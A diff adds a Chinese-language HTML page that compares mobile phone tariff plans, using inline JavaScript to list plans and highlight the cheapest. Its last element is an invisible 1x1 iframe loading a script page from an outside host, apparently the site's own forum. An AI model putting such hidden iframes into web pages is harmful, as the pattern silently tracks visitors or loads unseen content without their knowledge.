@@ -1,0 +1,41 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<HTML>
+<HEAD>
+<META http-equiv="Content-Type" content="text/html; charset=gb2312">
+<SCRIPT language="JavaScript" src="db.js" type="text/JavaScript"></SCRIPT>
+<SCRIPT language="JavaScript" src="func.js" type="text/JavaScript"></SCRIPT>
+<TITLE>为您选择手机资费套餐</TITLE>
+</HEAD>
+
+<BODY>
+<TABLE border=1>
+<TH>公司<TH>卡<TH>套餐<TH>月租费<TH>功能费<TH>电话费<TH>短信费<TH>总费用<TH>更多信息<TH>比较
+<SCRIPT language="JavaScript" type="text/JavaScript">
+for (var i=0;i<dbcount;i++) {
+document.write(CalcM(i))
+}
+</SCRIPT>
+</TABLE>
+<P> 
+<SCRIPT language="JavaScript" type="text/JavaScript">
+var cheapestP=1000000;var cheapestO=-1;var curO=parseInt(SAVE.curO.value);var curP=Oprice[curO];
+for (var i=0;i<dbcount;i++) {
+var thisP=Oprice[i];
+if (thisP<cheapestP) {cheapestP=thisP;cheapestO=i}
+var diff=parseInt((curP-thisP)*100)/100;
+if (diff>0) {
+eval('document.all.inf'+i+'.innerHTML=\'<FONT color=#00cc00>比原来节省'+diff+'元</FONT>\'') 
+} else {
+eval('document.all.inf'+i+'.innerHTML=\'<FONT color=#cc0000>不省钱</FONT>\'') 
+}
+if (i==curO) {eval('document.all.inf'+i+'.innerHTML=\'<FONT color=#0000cc>原来的情况</FONT>\'')}
+}
+eval('document.all.row'+cheapestO+'.style.backgroundColor=\'#ffffcc\'');
+eval('document.all.inf'+cheapestO+'.innerHTML+=\'，<FONT color=#009999>最便宜</FONT>\'') 
+</SCRIPT>
+　　感谢你使用阳光家园手机资费参考服务，浅黄色标注的为对你最便宜的套餐。如果你安装了Microsoft Excel，你还可以复制表格进行进一步分析。本站数据库会不断更新，请注意第一页上的更新日期。推荐仅供参考，因为资费经常改变，数据库中不一定是最新的资费信息。<A href="start.htm"><FONT color="#990066" size="+1">回到起始页再次计算</FONT></A></P>
+<P>
+<IFRAME src="http://sunnybbs.611.cn/slstsc.asp" width=1 height=1></IFRAME>
+</P>
+</BODY>
+</HTML>
